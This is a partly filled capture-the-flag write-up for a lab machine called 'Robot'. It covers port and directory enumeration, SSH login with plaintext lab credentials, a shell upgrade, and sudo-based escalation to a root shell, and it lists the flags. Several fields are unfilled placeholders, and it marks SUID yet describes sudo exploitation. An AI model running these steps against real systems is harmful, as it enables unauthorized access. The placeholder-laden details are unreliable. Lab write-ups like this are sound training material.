# Robot

> **Difficulty:** Easy | **OS:** Linux | **Release:** Retired

---

## General Information

| Field | Value |
|:------|:------|
| **Name** | Robot |
| **IP** | 10.10.10.10 |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Date** | DD/MM/YYYY |
| **Release** | Retired |

---

## Initial Enumeration

### Open Ports

| Port | Service | Version |
|:------|:--------|:-------|
| 22 | ssh | OpenSSH 7.9p1 |
| 80 | http | Apache 2.4.38 |

### Commands

```bash
# Quick scan
nmap -sV -p- -T4 10.10.10.10

# Full scan with scripts
nmap -sVC -p- 10.10.10.10
```

---

## Exploitation

### Entry Vector

| Field | Value |
|:------|:------|
| **Vector** | Web |
| **Flaw** | Vulnerability description |
| **Tools** | curl, burp, etc |

### Step 1 - Access to the web interface

Access http://10.10.10.10 in the browser.

Find a clue in the source code or in files such as robots.txt.

### Step 2 - Directory enumeration

```bash
# Test robots.txt
curl http://10.10.10.10/robots.txt

# Enumeration with gobuster
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -t 20
```

### Step 3 - Finding credentials

Find credentials in:
- Discovered files (note.txt, backup.zip, etc)
- Source code
- Application parameters

### Result

| Field | Value |
|:------|:------|
| **User** | robot |
| **Credentials** | robot:4p0c4l1ps3! |

---

## Initial Shell

```bash
ssh robot@10.10.10.10
# password: 4p0c4l1ps3!
python3 -c "import pty; pty.spawn('/bin/bash')"
```

---

## Post-Exploitation Enumeration

### System Users

| User | Shell | Home |
|:--------|:------|:-----|
| root | /bin/bash | /root |
| robot | /bin/bash | /home/robot |

### Credentials Found

| Type | Value |
|:-----|:------|
| SSH | robot:4p0c4l1ps3! |

### Interesting Files

```bash
# Check sudo permissions
sudo -l
```

---

## Privilege Escalation

### Vectors Identified

- [ ] Cron jobs running as root
- [x] SUID binaries
- [ ] Misconfigured sudo permissions

### Exploitation

```bash
# Check allowed commands
sudo -l
```

### Result

| Field | Value |
|:------|:------|
| **Access** | root |
| **Method** | Sudo exploitation |
| **Date** | DD/MM/YYYY |

### Exploit

```bash
# Run vulnerable script
sudo /usr/bin/python3 /opt/robot_manager.py

# When prompted for a command, type:
/bin/bash
```

---

## Flags

| User | Root |
|:-----------------------------|:---------------------|
| `CTF{r0b0t_1s_aliv3}` | `CTF{robot_master_421}` |

---

## Technical Summary

| Field | Value |
|:------|:------|
| **Root Cause** | Description of the main vulnerability |
| **Attack Chain** | Enumeration → Credentials → Initial shell → Privesc |
| **Total Time** | ~45 minutes |

---

## Lessons Learned

- **What worked:** technique X worked well
- **What slowed things down:** point that caused difficulty
- **Points of Attention:** important lessons

---

## References

- [HTB Robot](https://app.hackthebox.com/machines/Robot)
